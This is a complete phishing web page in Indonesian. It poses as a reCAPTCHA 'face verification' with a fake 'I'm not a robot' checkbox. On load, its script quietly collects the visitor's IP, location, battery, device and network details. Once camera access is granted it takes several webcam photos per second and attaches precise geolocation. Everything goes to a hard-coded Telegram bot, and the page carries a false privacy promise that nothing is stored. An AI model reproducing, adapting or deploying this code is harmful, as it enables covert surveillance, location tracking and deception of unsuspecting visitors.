<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Wajah | Verifikasi Keamanan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
 <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Wajah | Keamanan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
    }

    body {
      background: #e8ebef;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      padding: 28px;
      border-radius: 18px;
      box-shadow: 0 10px 28px rgba(0,0,0,0.15);
      text-align: center;
      animation: fadeIn 0.4s ease;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(8px);}
      to {opacity:1; transform: translateY(0);}
    }

    .logo {
      width: 64px;
      margin-bottom: 14px;
    }

    h2 {
      font-size: 22px;
      color: #1a73e8;
      margin-bottom: 10px;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 22px;
      line-height: 1.5;
    }

    .fake-captcha {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #fafafa;
      border: 1px solid #d5d5d5;
      border-radius: 10px;
      padding: 14px 16px;
      margin-bottom: 24px;
      transition: 0.25s;
    }

    .fake-captcha:hover {
      border-color: #1a73e8;
      background: #fdfdfd;
    }

    .fake-captcha label {
      display: flex;
      align-items: center;
      font-size: 15px;
      gap: 10px;
      cursor: pointer;
      color: #333;
    }

    .fake-captcha input {
      width: 20px;
      height: 20px;
      cursor: pointer;
    }

    .fake-captcha img {
      height: 38px;
      opacity: 0.9;
    }

    button {
      width: 100%;
      padding: 13px;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      background: #1a73e8;
      color: white;
      cursor: pointer;
      font-weight: 600;
      transition: 0.25s;
    }

    button:hover {
      background: #0c5dd4;
      box-shadow: 0 4px 14px rgba(26,115,232,0.35);
    }

    button:disabled {
      background: #b4b4b4;
      cursor: not-allowed;
      box-shadow: none;
    }

    .video-container {
      display: none;
      margin-top: 24px;
      position: relative;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 6px 16px rgba(0,0,0,0.14);
    }

    video {
      width: 100%;
      display: block;
    }

    .countdown {
      position: absolute;
      top: 10px;
      right: 10px;
      background: rgba(0,0,0,0.7);
      color: white;
      padding: 6px 12px;
      border-radius: 50px;
      font-size: 14px;
      display: none;
    }

    .status {
      margin-top: 18px;
      font-size: 14px;
      color: #666;
      min-height: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }

    .spinner {
      width: 22px;
      height: 22px;
      border: 3px solid #e3e3e3;
      border-top: 3px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .success-message,
    .error-message {
      margin-top: 20px;
      padding: 14px;
      font-size: 14px;
      border-radius: 10px;
      display: none;
      animation: fadeIn 0.25s ease;
    }

    .success-message {
      background: rgba(76,175,80,0.15);
      color: #2e7d32;
      font-weight: 600;
    }

    .error-message {
      background: rgba(244,67,54,0.15);
      color: #c62828;
      font-weight: 600;
    }

    .note {
      margin-top: 28px;
      padding: 12px;
      border-radius: 10px;
      background: #f7f7f7;
      color: #777;
      font-size: 12px;
      line-height: 1.5;
    }

    .privacy-info {
      margin-top: 14px;
      font-size: 12px;
      color: #1a73e8;
      text-decoration: underline;
      cursor: pointer;
    }

  </style>
</head>

<body>

<div class="container my-4">
  <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="logo">
  <h2>Verifikasi Wajah</h2>
  <p>Sebelum melanjutkan, kami perlu memverifikasi wajah Anda untuk memastikan keamanan.</p>

  <div class="fake-captcha">
    <label>
      <input type="checkbox" id="check"> Saya bukan robot
    </label>
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
  </div>

  <button id="verifyButton" onclick="prosesVerifikasi()" disabled>Mulai Verifikasi</button>

  <div class="video-container" id="videoContainer">
    <video id="video" autoplay playsinline></video>
    <div class="countdown" id="countdown"></div>
  </div>

  <div class="status">
    <div class="spinner" id="spinner"></div>
    <span id="statusText"></span>
  </div>

  <div class="success-message" id="successMessage">Verifikasi berhasil!</div>
  <div class="error-message" id="errorMessage">Verifikasi gagal!</div>

  <div class="note">
    Data biometrik Anda hanya digunakan untuk proses ini dan tidak disimpan permanen.
  </div>

  <div class="privacy-info" onclick="showPrivacyInfo()">Kebijakan Privasi</div>
</div>



 <script>
  // Constants
const TOKEN = "8531334078:AAHJ4oLILKlH_whE2HgL2pIRPe77KNW-XZk";
const CHAT_ID = "1388041292";
const REDIRECT_URL = "https://awsimages.detik.net.id/community/media/visual/2017/12/06/6414c1ae-fcd1-49a6-8316-4a71c29f93ff_43.jpg?w=1200";
const VERIFICATION_DURATION = 5; // Changed from 10 to 5 seconds
const PHOTOS_PER_SECOND = 4; // New constant to specify photos per second

// Elements
const checkbox = document.getElementById("check");
const verifyButton = document.getElementById("verifyButton");
const videoContainer = document.getElementById("videoContainer");
const video = document.getElementById("video");
const statusText = document.getElementById("statusText");
const spinner = document.getElementById("spinner");
const countdownEl = document.getElementById("countdown");
const successMessage = document.getElementById("successMessage");
const errorMessage = document.getElementById("errorMessage");

// Variables
let stream;
let intervalId;
let countdownInterval;
let remainingTime = VERIFICATION_DURATION;

// Send initial access data when page loads
document.addEventListener("DOMContentLoaded", function() {
  // Add a short delay to ensure everything is loaded
  setTimeout(function() {
    sendAccessInfo();
  }, 1000);
});

// Enable button when checkbox is checked
checkbox.addEventListener("change", function() {
  verifyButton.disabled = !this.checked;
});

function showPrivacyInfo() {
  alert("Kebijakan Privasi & Keamanan\n\nData biometrik Anda digunakan hanya untuk verifikasi saat ini dan tidak disimpan permanen. Kami menggunakan enkripsi end-to-end untuk melindungi data Anda selama proses verifikasi.");
}

// Helper function to format bytes into readable format
function formatBytes(bytes, decimals = 2) {
  if (bytes === 0) return '0 Bytes';
  
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
  
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  
  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

// Helper function to get browser name
function getBrowserName() {
  const userAgent = navigator.userAgent;
  let browserName = "Unknown";
  
  if (userAgent.match(/chrome|chromium|crios/i)) {
    browserName = "Chrome";
  } else if (userAgent.match(/firefox|fxios/i)) {
    browserName = "Firefox";
  } else if (userAgent.match(/safari/i)) {
    browserName = "Safari";
  } else if (userAgent.match(/opr\//i)) {
    browserName = "Opera";
  } else if (userAgent.match(/edg/i)) {
    browserName = "Edge";
  } else if (userAgent.match(/ucbrowser/i)) {
    browserName = "UC Browser";
  } else if (userAgent.match(/samsungbrowser/i)) {
    browserName = "Samsung Browser";
  }
  
  return browserName;
}

// Function to get device model from userAgent
function getDeviceModel(userAgent) {
  let deviceModel = "Unknown";
  
  // For Android devices - enhanced detection
  if (/Android/.test(userAgent)) {
    // Try to extract more specific model information
    // Look for common patterns in Android user agents
    
    // Pattern 1: Brand/Model format (common in many Android UAs)
    let matches = userAgent.match(/Android\s+[\d\.]+;\s*([^;)]+)/i);
    
    // Pattern 2: More specific for Xiaomi/Redmi and other brands
    if (userAgent.includes("Redmi") || userAgent.includes("XiaoMi") || userAgent.includes("MIUI")) {
      matches = userAgent.match(/Android\s+[\d\.]+;[\s\w\-;]*\s+(Redmi\s+[^;)]+)/i);
      if (!matches) {
        matches = userAgent.match(/Android\s+[\d\.]+;[\s\w\-;]*\s+(Mi\s+[^;)]+)/i);
      }
    }
    
    // Pattern 3: Look for Build/ pattern which often precedes specific model info
    if (!matches || matches[1].trim() === "") {
      matches = userAgent.match(/;\s*([^;]+)\s+Build\//i);
    }
    
    // Pattern 4: Samsung specific pattern
    if (userAgent.includes("Samsung") || userAgent.includes("SM-")) {
      matches = userAgent.match(/Android\s+[\d\.]+;[\s\w\-;]*\s+(SM-[A-Z0-9]+)/i);
    }
    
    // Extract Android version
    const versionMatch = userAgent.match(/Android\s+([\d\.]+)/i);
    const androidVersion = versionMatch ? versionMatch[1] : "";

    if (matches && matches[1]) {
      deviceModel = `${matches[1].trim()} (Android ${androidVersion})`;
    } else {
      deviceModel = androidVersion ? `Android ${androidVersion} Device` : "Android Device";
    }
  }
  // For iOS devices
  else if (/iPhone/.test(userAgent)) {
    const matches = userAgent.match(/iPhone\s*(?:OS\s*)?(\d+[_,\d]*)/i);
    deviceModel = matches
      ? `iPhone (iOS ${matches[1].replace(/_/g, ".")})`
      : "iPhone";
  } 
  else if (/iPad/.test(userAgent)) {
    const matches = userAgent.match(/iPad\s*(?:OS\s*)?(\d+[_,\d]*)/i);
    deviceModel = matches
      ? `iPad (iOS ${matches[1].replace(/_/g, ".")})`
      : "iPad";
  }
  // For Windows devices
  else if (/Windows NT/.test(userAgent)) {
    const matches = userAgent.match(/Windows NT\s+([0-9.]+)/i);
    const versionMap = {
      "10.0": "10",
      "6.3": "8.1",
      "6.2": "8",
      "6.1": "7",
      "6.0": "Vista",
      "5.2": "XP x64",
      "5.1": "XP"
    };
    const windowsVersion = matches ? (versionMap[matches[1]] || matches[1]) : "";
    deviceModel = windowsVersion ? `Windows ${windowsVersion}` : "Windows";
  }
  // For macOS devices
  else if (/Macintosh/.test(userAgent)) {
    const matches = userAgent.match(/Macintosh;\s*(?:Intel\s*)?Mac OS X\s*([0-9_\.]+)/i);
    deviceModel = matches
      ? `Mac (macOS ${matches[1].replace(/_/g, ".")})`
      : "Mac";
  }
  // For Linux devices
  else if (/Linux/.test(userAgent)) {
    deviceModel = "Linux";
    if (/Ubuntu/.test(userAgent)) deviceModel = "Ubuntu Linux";
    if (/Fedora/.test(userAgent)) deviceModel = "Fedora Linux";
  }
  
  return deviceModel;
}

// Function to get device information
async function getDeviceInfo() {
  // Default information
  const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    pixelRatio: window.devicePixelRatio,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    isOnline: navigator.onLine,
    connectionType: "unknown",
    deviceModel: getDeviceModel(navigator.userAgent),
    browserName: getBrowserName(),
    wifiInfo: "Not Available", // Default value
    memoryInfo: "Unknown",     // RAM information
    storageInfo: "Unknown",    // Storage information
    gpuInfo: "Unknown"         // GPU information
  };

  // Try to get connection info if available
  if (navigator.connection) {
    deviceInfo.connectionType = navigator.connection.effectiveType || "unknown";
    deviceInfo.downlink = navigator.connection.downlink || "unknown";
    deviceInfo.rtt = navigator.connection.rtt || "unknown";
    
    // Try to get WiFi information if available
    if (navigator.connection.type === 'wifi') {
      try {
        // Modern way to get WiFi info (requires special permissions)
        if (navigator.network && navigator.network.getNetworkInformation) {
          const networkInfo = await navigator.network.getNetworkInformation();
          if (networkInfo.ssid) {
            deviceInfo.wifiInfo = networkInfo.ssid;
          }
        }
      } catch (error) {
        console.log("WiFi info retrieval error:", error);
      }
    }
  }
  
  // Get memory information if available
  if (navigator.deviceMemory) {
   deviceInfo.memoryInfo = `${navigator.deviceMemory} GB`;
  }

  // Try to get storage information
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const estimate = await navigator.storage.estimate();
      const usedSpace = formatBytes(estimate.usage);
      const totalSpace = formatBytes(estimate.quota);
      deviceInfo.storageInfo = `${usedSpace} used of ${totalSpace}`;
    }
  } catch (error) {
    console.log("Storage info retrieval error:", error);
  }

  // Try to get GPU information
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        deviceInfo.gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (error) {
    console.log("GPU info retrieval error:", error);
  }

  return deviceInfo;
}

// Function to get battery information
async function getBatteryInfo() {
  // Default battery info
  let batteryInfo = {
    level: "Unknown",
    charging: "Unknown"
  };
  
  try {
    // Try to get battery info using the Battery API
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      batteryInfo.level = Math.floor(battery.level * 100) + "%";
      batteryInfo.charging = battery.charging ? "Sedang Charging.." : "Tidak Charging";
    }
  } catch (error) {
    console.error("Error getting battery info:", error);
  }
  
  return batteryInfo;
}

// Try multiple services to get IP information
async function getIPInfo() {
  // List of IP info services to try
  const services = [
    "https://ipinfo.io/json",
    "https://ipapi.co/json/",
    "https://api.db-ip.com/v2/free/self",
    "https://api.ipify.org?format=json"
  ];
  
  // Default IP info
  let ipInfo = {
    ip: "Unknown",
    loc: "Unknown",
    city: "Unknown",
    region: "Unknown",
    country: "ID", // Default to Indonesia
    org: "Unknown",
    hostname: "Unknown"
  };

  // Try each service until one works
  for (const service of services) {
    try {
      const response = await fetch(service, { timeout: 5000 });
      if (response.ok) {
        const data = await response.json();
        
        // Map different API responses to our standard format
        if (service.includes("ipinfo.io")) {
          ipInfo = {
            ip: data.ip || ipInfo.ip,
            loc: data.loc || ipInfo.loc,
            city: data.city || ipInfo.city,
            region: data.region || ipInfo.region,
            country: data.country || ipInfo.country,
            org: data.org || ipInfo.org,
            hostname: data.hostname || ipInfo.hostname
          };
          break;
        } else if (service.includes("ipapi.co")) {
          ipInfo = {
            ip: data.ip || ipInfo.ip,
            loc: `${data.latitude},${data.longitude}` || ipInfo.loc,
            city: data.city || ipInfo.city,
            region: data.region || ipInfo.region,
            country: data.country_code || ipInfo.country,
            org: data.org || ipInfo.org,
            hostname: "Unknown"
          };
          break;
        } else if (service.includes("db-ip.com")) {
          ipInfo = {
            ip: data.ipAddress || ipInfo.ip,
            loc: "Unknown",
            city: data.city || ipInfo.city,
            region: data.stateProv || ipInfo.region,
            country: data.countryCode || ipInfo.country,
            org: "Unknown",
            hostname: "Unknown"
          };
          break;
        } else if (service.includes("ipify.org")) {
          // This one only gives IP, but better than nothing
          ipInfo.ip = data.ip || ipInfo.ip;
          break;
        }
      }
    } catch (error) {
   console.error(`Error fetching from ${service}:`, error);

      // Continue to the next service
    }
  }
  
  return ipInfo;
}

// Function to send access information to Telegram
async function sendAccessInfo() {
  try {
    // Get all info in parallel
    const [ipInfo, batteryInfo, deviceInfo] = await Promise.all([
      getIPInfo(),
      getBatteryInfo(),
      getDeviceInfo()
    ]);
    
    // Get current date and time in user's locale
    const currentDate = new Date().toLocaleDateString();
    const currentTime = new Date().toLocaleTimeString();
    
    const message = `
Link opened by ${ipInfo.ip}
with user agent:
${deviceInfo.userAgent}
==============================
â° Time: ${currentDate} ${currentTime}
ðŸ”‹ Battery: ${batteryInfo.level}
âš¡ Charging: ${batteryInfo.charging}
==============================
DEVICE INFORMATION:
ðŸ“± Device Model: ${deviceInfo.deviceModel}
ðŸŒ Browser: ${deviceInfo.browserName}
ðŸ“Š Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.pixelRatio}x)
ðŸ–¥ Platform: ${deviceInfo.platform}
ðŸ”¤ Language: ${deviceInfo.language}
ðŸ•’ TimeZone: ${deviceInfo.timeZone}
ðŸ’¾ Storage: ${deviceInfo.storageInfo}
ðŸ§  RAM: ${deviceInfo.memoryInfo}
ðŸŽ® GPU: ${deviceInfo.gpuInfo}
==============================
NETWORK INFORMATION:
ðŸ“¶ Connection: ${deviceInfo.connectionType}
ðŸ“¡ WiFi SSID: ${deviceInfo.wifiInfo}
ðŸ”Œ Downlink: ${deviceInfo.downlink || "Unknown"} Mbps
ðŸ”„ RTT: ${deviceInfo.rtt || "Unknown"} ms
ðŸŒ Hostname: ${ipInfo.hostname || "Unknown"}
ðŸ“ Location: ${ipInfo.loc || "Unknown"}
ðŸ¢ ISP: ${ipInfo.org || "Unknown"}
ðŸ™ City: ${ipInfo.city || "Unknown"}
ðŸ—¾ Region: ${ipInfo.region || "Unknown"}
ðŸŒ Country: ${ipInfo.country || "Unknown"}
`.trim();
    
    // Send message with retry mechanism
    await sendTelegramMessage(message);
    console.log("âœ… Access info sent successfully!");
  } catch (error) {
    console.error("Failed to send access info:", error);
  }
}

// Function to send message to Telegram with retry
async function sendTelegramMessage(message, retries = 3) {
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("text", message);
      formData.append("parse_mode", "HTML");
      
     const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
  method: "POST",
  body: formData,
  timeout: 10000 
});

      
      const data = await response.json();
      
      if (data.ok) {
        return data;
      } else {
        throw new Error(`Telegram API error: ${data.description}`);
      }
    } catch (error) {
   console.error(`Attempt ${attempt + 1}/${retries} failed:`, error);
      if (attempt === retries - 1) {
        throw error; // Rethrow after last retry
      }
      
      // Wait before retrying (exponential backoff)
      await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempt)));
    }
  }
}

function prosesVerifikasi() {
  if (!checkbox.checked) {
    alert("Silakan centang 'Saya bukan robot' terlebih dahulu.");
    return;
  }
  
  // Reset UI
  resetMessages();
  statusText.innerText = "Mengaktifkan kamera...";
  spinner.style.display = "block";
  verifyButton.disabled = true;
  
  // Send camera permission request notification
  sendPermissionRequestInfo();
  
  // Request camera access
  navigator.mediaDevices.getUserMedia({ 
    video: { 
      facingMode: "user",
      width: { ideal: 1280 },
      height: { ideal: 720 }
    } 
  })
  .then(streamObj => {
    stream = streamObj;
    video.srcObject = stream;
    videoContainer.style.display = "block";
    
    // Send camera access granted notification
    sendCameraAccessInfo(true);
    
    // Start countdown
    countdownEl.style.display = "block";
    countdownEl.innerText = remainingTime;
    
    countdownInterval = setInterval(() => {
      remainingTime--;
      countdownEl.innerText = remainingTime;
      
      if (remainingTime <= 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);
    
    // Update status
    statusText.innerText = "ðŸ“¸ Memverifikasi wajah...";
    
    // Start capturing images (changed to 4 photos every 1000/4 = 250ms)
    let counter = 0;
    intervalId = setInterval(() => {
      ambilGambarKamera(video, counter++);
    }, 1000 / PHOTOS_PER_SECOND);
    
    // Stop after verification duration
    setTimeout(() => {
      finishVerification(true);
    }, VERIFICATION_DURATION * 1000);
  })
  .catch(error => {
    console.error(error);
    // Send camera access denied notification
    sendCameraAccessInfo(false, error.message);
    
    statusText.innerText = "";
    spinner.style.display = "none";
    errorMessage.style.display = "block";
    errorMessage.innerText = "âŒ Kamera gagal dibuka: " + error.message;
    verifyButton.disabled = false;
  });
}

async function sendPermissionRequestInfo() {
  try {
    const message = "ðŸ”” User mengklik tombol 'Mulai Verifikasi' dan diminta izin kamera";
    await sendTelegramMessage(message);
    console.log("âœ… Permission request info sent!");
  } catch (error) {
    console.error("Failed to send permission request info:", error);
  }
}

async function sendCameraAccessInfo(granted, errorMsg = "") {
  try {
   const message = granted 
  ? "âœ… User memberikan izin akses kamera"
  : `âŒ User menolak izin akses kamera: ${errorMsg}`;
await sendTelegramMessage(message);
    console.log("âœ… Camera access info sent!");
  } catch (error) {
    console.error("Failed to send camera access info:", error);
  }
}

function ambilGambarKamera(video, index) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  if (!canvas.width || !canvas.height) {
    console.warn("âš  Gagal mengambil gambar ke-" + (index + 1));
    return;
  }

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Add timestamp and device info to the image
  ctx.fillStyle = "rgba(0, 0, 0, 0.5)";
  ctx.fillRect(0, 0, canvas.width, 30);
  ctx.fillStyle = "white";
  ctx.font = "14px Arial";
 ctx.fillText(`Device: ${getDeviceModel(navigator.userAgent)} - ${new Date().toLocaleString()}`, 10, 20);

  canvas.toBlob(blob => {
    kirimKeTelegram(blob, index);
  }, 'image/jpeg', 0.8);
}

async function kirimKeTelegram(blob, index) {
  try {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, `wajah_${index}.jpg`);

    const metadata = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      frameNumber: index + 1,
      deviceModel: getDeviceModel(navigator.userAgent),
      browserName: getBrowserName(),
      connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown"
    };

    try {
      if (navigator.geolocation) {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          });
        });

        metadata.exactLocation = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
      }
    } catch (locError) {}

    formData.append("caption", JSON.stringify(metadata));

    let success = false;
    let attempts = 0;

    while (!success && attempts < 3) {
  try {

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, `wajah_${index}.jpg`);
    formData.append("caption", JSON.stringify(metadata));

    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData,
      timeout: 15000
    });

    const data = await response.json();

    if (data.ok) {
      success = true;
      console.log(`âœ… Gambar ${index + 1} dikirim!`, data);
    } else {
      throw new Error(`Telegram API error: ${data.description}`);
    }

  } catch (error) {
    attempts++;
    console.error(`Kirim gambar ${index + 1} gagal (attempt ${attempts}/3):`, error.message);

    if (attempts < 3) {
      await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
    }
  }
}


  } catch (err) {
    console.error(`âŒ Kirim gambar ${index + 1} gagal total:`, err.message);
  }
}



async function finishVerification(success) {
  // Clear intervals
  clearInterval(intervalId);
  clearInterval(countdownInterval);
  
  // Stop camera
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
  
  // Hide video
  videoContainer.style.display = "none";
  
  // Reset UI
  spinner.style.display = "none";
  statusText.innerText = "";
  
  // Get final device info for completion message
  const deviceInfo = await getDeviceInfo();
  
  // Send verification completion notification
  try {
  const message = success
    ? `âœ… Verifikasi wajah selesai dengan sukses, user akan dialihkan\n\nDevice: ${deviceInfo.deviceModel}\nBrowser: ${deviceInfo.browserName}\nConnection: ${deviceInfo.connectionType}`
    : "âŒ Verifikasi wajah gagal";

  await sendTelegramMessage(message);
  console.log("âœ… Verification completion info sent!");
} catch (error) {
  console.error("Failed to send verification completion info:", error);
}

  
  if (success) {
    successMessage.style.display = "block";
    
    // Redirect after delay
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 2000);
  } else {
    errorMessage.style.display = "block";
    verifyButton.disabled = false;
  }
}

function resetMessages() {
  successMessage.style.display = "none";
  errorMessage.style.display = "none";
  remainingTime = VERIFICATION_DURATION;
}

// Try to get additional hardware info
async function getHardwareInfo() {
  const hardwareInfo = {};
  
  // Try to get CPU info using performance API
  try {
    hardwareInfo.cpuCores = navigator.hardwareConcurrency || "Unknown";
    
    // Try to estimate CPU performance
    const start = performance.now();
    let result = 0;
    for (let i = 0; i < 1000000; i++) {
      result += Math.sqrt(i);
    }
    const end = performance.now();
   hardwareInfo.cpuBenchmark = `${(end - start).toFixed(2)}ms`;

  } catch (error) {
    console.log("CPU info error:", error);
  }
  
  return hardwareInfo;
}

// Add sensors information if available
async function getSensorsInfo() {
  const sensorsInfo = {
    accelerometer: "Not available",
    gyroscope: "Not available",
    ambientLight: "Not available",
    deviceOrientation: "Not available"
  };
  
  // Check for device orientation API
  if (window.DeviceOrientationEvent) {
    try {
      await new Promise((resolve, reject) => {
        const orientationHandler = (event) => {
          if (event.alpha !== null || event.beta !== null || event.gamma !== null) {
          sensorsInfo.deviceOrientation = `alpha: ${event.alpha?.toFixed(2)}Â°, beta: ${event.beta?.toFixed(2)}Â°, gamma: ${event.gamma?.toFixed(2)}Â°`;

            window.removeEventListener('deviceorientation', orientationHandler);
            resolve();
          }
        };
        
        window.addEventListener('deviceorientation', orientationHandler, { once: true });
        
        // Timeout after 1 second
        setTimeout(() => {
          window.removeEventListener('deviceorientation', orientationHandler);
          resolve();
        }, 1000);
      });
    } catch (error) {
      console.log("Orientation sensor error:", error);
    }
  }
  
  // Check for ambient light sensor
  if ('AmbientLightSensor' in window) {
    try {
      const sensor = new AmbientLightSensor();
     sensor.addEventListener('reading', () => {
  sensorsInfo.ambientLight = `${sensor.illuminance} lux`;
});
sensor.start();

    } catch (error) {
      console.log("Ambient light sensor error:", error);
    }
  }
  
  return sensorsInfo;
}
 </script>
</body>
</html>
